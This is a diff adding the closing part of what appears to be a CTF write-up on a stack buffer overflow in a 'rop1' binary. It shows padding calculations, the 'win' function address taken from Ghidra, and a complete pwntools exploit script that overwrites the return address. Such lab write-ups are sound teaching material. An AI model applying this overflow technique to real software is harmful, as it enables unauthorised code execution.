@@ -267,4 +267,37 @@ So, we have already filled up 68 bytes of the stack, and we need to pad the rest
 
 (For less confusion, the initial A's are for the first 64 byte overflow, and the B's are for the padding to the ```eip`` register)
 
-After we have done that, we are now at the ```eip``` register (return address) and we should now be able to add the address of the ```win``` function to the end of our payload, and that should overwrite the return address with the address of the ````win``` func
+After we have done that, we are now at the ```eip``` register (return address) and we should now be able to add the address of the ```win``` function to the end of our payload, and that should overwrite the return address with the address of the ````win``` function
+
+The address of the ```win``` function is ```0x080484ab``` and can be found in Ghidra, seen below highlighted in green:
+
+![image](https://github.com/0xwyvn/0xwyvn.github.io/assets/114181159/fb414dbb-ad0a-40ae-93cb-ac88ae5944fa)
+
+Below is the complete exploit, which you can copy if you want:
+
+![image](https://github.com/0xwyvn/0xwyvn.github.io/assets/114181159/65a76f57-333b-448b-b049-021ed75bd045)
+
+```
+from pwn import *
+
+target = process("./rop1")
+
+payload = b""
+payload += b"A"*64
+payload += p32(0xdeadbeef)
+payload += b"B"*12
+payload += p32(0x080484ab)
+
+f = open("payload", "wb") # make "payload" file
+f.write(payload) # Write payload to "payload" file
+f.close() # finito
+
+target.send(payload)
+target.interactive()
+```
+
+And as you can see, the exploit worked flawlessly:
+
+![image](https://github.com/0xwyvn/0xwyvn.github.io/assets/114181159/a5756c60-88b2-4dde-af9e-3c6a0d34b687)
+
+***Count ya bytes, people!***
